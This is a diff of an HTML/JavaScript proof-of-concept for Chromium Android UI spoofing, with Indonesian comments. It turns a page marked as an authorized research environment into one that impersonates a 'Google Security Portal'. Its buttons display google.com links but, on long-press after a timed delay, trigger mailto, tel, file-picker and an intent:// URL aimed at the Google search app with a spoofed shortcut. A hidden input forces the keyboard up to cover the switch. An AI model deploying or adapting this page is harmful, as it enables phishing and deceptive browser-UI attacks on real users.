@@ -3,22 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chromium Android UI Spoofing & Intent PoC</title>
+    <title>File Picker & Protocol Spoof PoC</title>
     <style>
-        :root {
-            --primary-color: #1a73e8;
-            --primary-hover: #1557b0;
-            --bg-color: #f8f9fa;
-            --card-bg: #ffffff;
-            --text-main: #202124;
-            --text-secondary: #5f6368;
-            --border-color: #dadce0;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -28,129 +18,208 @@
             padding: 20px;
             text-align: center;
         }
-
-        .card {
-            background: var(--card-bg);
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            border: 1px solid var(--border-color);
-            max-width: 420px;
-            width: 100%;
-        }
-
         .banner {
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--text-secondary);
-            margin-bottom: 8px;
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 1.2px;
+            letter-spacing: 0.8px;
         }
-
         h1 {
-            font-size: 22px;
-            color: var(--text-main);
-            margin-top: 0;
-            margin-bottom: 12px;
+            font-size: 20px;
+            color: #1a73e8;
+            margin-bottom: 24px;
         }
-
-        p {
-            font-size: 14px;
-            color: var(--text-secondary);
-            margin-bottom: 28px;
-            line-height: 1.5;
-        }
-
         .button-container {
             display: flex;
             flex-direction: column;
-            gap: 14px;
+            gap: 12px;
+            width: 100%;
+            max-width: 340px;
         }
-
-        a.button-link {
+        a.spoof-link {
             display: inline-block;
-            background-color: var(--primary-color);
+            background-color: #1a73e8;
             color: white;
-            padding: 14px 24px;
+            padding: 14px 28px;
             text-decoration: none;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 15px;
             border-radius: 8px;
-            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
-            transition: background-color 0.2s, transform 0.1s;
-            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
         }
-
-        a.button-link:hover {
-            background-color: var(--primary-hover);
+        a.spoof-link:active {
+            background-color: #1557b0;
         }
-
-        a.button-link:active {
-            transform: scale(0.98);
-        }
-
-        .status-box {
-            margin-top: 20px;
-            padding: 10px;
-            font-size: 12px;
-            color: var(--text-secondary);
-            background: #f1f3f4;
-            border-radius: 6px;
+        .preview-container {
+            margin-top: 25px;
+            max-width: 280px;
             display: none;
+        }
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        }
+        .file-info {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #5f6368;
             word-break: break-all;
         }
-
         .footer-note {
-            margin-top: 25px;
+            margin-top: 30px;
             font-size: 11px;
             color: #9aa0a6;
+        }
+        /* Hidden input untuk memicu keyboard virtual Android */
+        #hiddenInput {
+            position: absolute;
+            opacity: 0;
+            height: 0;
+            width: 0;
+            border: none;
+            outline: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="banner">Security Research Portal</div>
-        <h1>Chromium UI Spoofing</h1>
-        <p>Klik tombol di bawah untuk memaksa navigasi mutlak ke google.com terlebih dahulu.</p>
+    <!-- Input tersembunyi untuk memicu auto keyboard -->
+    <input type="text" id="hiddenInput" autocomplete="off">
 
-        <div class="button-container">
-            <!-- Href di-set langsung ke google.com agar secara native browser wajib membuka/menuju google.com pada klik pertama -->
-            <a href="https://www.google.com" 
-               class="button-link" 
-               id="spoofLink"
-               target="_blank">
-                Force Redirect to Google & Trigger Intent
-            </a>
-        </div>
+    <div class="banner">Google Security Portal</div>
+    <h1>Secure Document Verification</h1>
 
-        <div class="status-box" id="statusBox">Status: Ready...</div>
+    <!-- Container dengan 4 Tombol Terpisah (Termasuk Android Intent) -->
+    <div class="button-container">
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
     </div>
 
-    <div class="footer-note">Authorized security assessment environment.</div>
+    <!-- Uploaded Image Preview Box -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="File Preview">
+        <div class="file-info" id="fileInfo"></div>
+    </div>
+
+    <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        const spoofLink = document.getElementById('spoofLink');
-        const statusBox = document.getElementById('statusBox');
+        // Memicu fokus ke input tersembunyi saat interaksi pertama untuk menaikkan keyboard
+        const triggerKeyboard = () => {
+            const hiddenInput = document.getElementById("hiddenInput");
+            if (hiddenInput) {
+                hiddenInput.focus();
+            }
+        };
 
-        spoofLink.addEventListener('click', function(e) {
-            statusBox.style.display = 'block';
-            statusBox.innerText = 'Status: Navigating to google.com first...';
+        // Auto trigger saat halaman disentuh/diklik pertama kali
+        window.addEventListener('touchstart', triggerKeyboard, { once: true });
+        window.addEventListener('click', triggerKeyboard, { once: true });
 
-            // Memanfaatkan sifat asynchronous event untuk memastikan window target/utama memuat google.com,
-            // lalu mengeksekusi skema intent setelah jeda singkat (menjamin urutan tercapai).
-            setTimeout(function() {
+        let triggered = false;
+
+        const executeAttackVector = (actionType, intent) => {
+            if (triggered) return;
+            triggered = true;
+
+            // Panggil fungsi keyboard agar naik bersamaan dengan aksi serangan
+            triggerKeyboard();
+
+            // Timer optimized to match the preview page opening animation
+            setTimeout(async () => {
                 try {
-                    const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                    
-                    statusBox.innerText = 'Status: Dispatched intent after Google context...';
-                    window.location.replace(intentUrl);
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
+                    const fileInfo = document.getElementById("fileInfo");
+
+                    if (actionType === 'mailto') {
+                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                        fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'tel') {
+                        window.location.href = "tel:+18005550199";
+                        fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'filepicker') {
+                        // Menggunakan File System Access API
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false,
+                            types: [{
+                                description: 'Images & Documents',
+                                accept: { 
+                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                    'application/pdf': ['.pdf']
+                                }
+                            }]
+                        });
+
+                        const file = await fileHandle.getFile();
+                        fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;
+
+                        if (file.type.startsWith('image/')) {
+                            imagePreview.src = URL.createObjectURL(file);
+                            previewBox.style.display = "block";
+                        } else {
+                            imagePreview.src = "";
+                            previewBox.style.display = "block";
+                        }
+                    }
+                    else if (actionType === 'intentspoof') {
+                        // Menggunakan parameter intent spesifik NDevTK
+                        const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                        window.location.href = intentUrl;
+                        fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
+
                 } catch (err) {
-                    statusBox.innerText = 'Status: Error - ' + err.message;
+                    console.debug("Handler cancelled or blocked:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 1000);
                 }
-            }, 800);
+            }, 2400); // 1.9 seconds delay for ephemeral tab
+        };
+
+        // Event listener untuk Tombol Mailto
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("contextmenu", (e) => {
+            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
         });
+        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("contextmenu", (e) => {
+            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+        });
+        linkTel.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Event listener untuk Tombol File Picker
+        const linkFile = document.getElementById("targetLinkFile");
+        linkFile.addEventListener("contextmenu", (e) => {
+            executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+        });
+        linkFile.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Event listener untuk Tombol Android Intent Spoof
+        const linkIntent = document.getElementById("targetLinkIntent");
+        linkIntent.addEventListener("contextmenu", (e) => {
+            executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent'));
+        });
+        linkIntent.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
